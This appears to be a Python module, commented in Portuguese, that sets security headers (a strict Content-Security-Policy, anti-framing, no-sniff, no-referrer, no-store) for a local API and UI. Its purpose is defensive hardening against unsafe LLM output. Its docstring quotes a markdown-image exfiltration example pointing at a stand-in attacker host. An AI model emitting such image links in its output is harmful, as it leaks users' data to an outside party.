# -*- coding: utf-8 -*-
"""Cabeçalhos de segurança de toda resposta da API local e da tela.

Parte do item N3 (saída insegura): mesmo que um texto do modelo chegasse
à página como HTML, o navegador não executa script de fora nem script
inline, e não carrega imagem de outro endereço (o caminho clássico de
vazamento por LLM: `![x](https://atacante/pixel.png?dado=...)`).

- Content-Security-Policy: script, estilo, imagem e conexão só da própria
  origem. O estilo inline fica liberado porque o Mantine escreve `style=`
  em componente. `BPR_CSP_MODO=relatorio` só avisa, para investigar.
- X-Frame-Options e frame-ancestors: a tela dentro de iframe de outro
  site, para enganar o clique.
- X-Content-Type-Options: o navegador "adivinhar" que JSON é HTML.
- Referrer-Policy e Permissions-Policy: nada de URL indo para fora nem
  câmera, microfone ou localização.

O /api/docs usa o Swagger UI, que vem de CDN e tem script inline; ele
recebe política própria, aberta só para isso.
"""

from __future__ import annotations

from . import config

CSP_TELA = "; ".join([
    "default-src 'self'",
    "script-src 'self'",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data:",
    "font-src 'self' data:",
    "connect-src 'self'",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
])

CSP_DOCS = "; ".join([
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net",
    "style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net",
    "img-src 'self' data: https://fastapi.tiangolo.com",
    "connect-src 'self'",
    "frame-ancestors 'none'",
])


def cabecalhos(caminho: str) -> dict[str, str]:
    saida = {
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "DENY",
        "Referrer-Policy": "no-referrer",
        "Permissions-Policy": "camera=(), microphone=(), geolocation=(), payment=()",
        "Cross-Origin-Opener-Policy": "same-origin",
        "Cross-Origin-Resource-Policy": "same-origin",
    }
    if config.CSP_MODO != "desligado":
        nome = ("Content-Security-Policy-Report-Only" if config.CSP_MODO == "relatorio"
                else "Content-Security-Policy")
        saida[nome] = CSP_DOCS if caminho.startswith("/api/docs") else CSP_TELA
    # Resposta da API não fica em cache do navegador: o resultado de uma
    # análise é dado de negócio e não deve sobrar no disco do navegador.
    if caminho.startswith("/api/"):
        saida["Cache-Control"] = "no-store"
    return saida
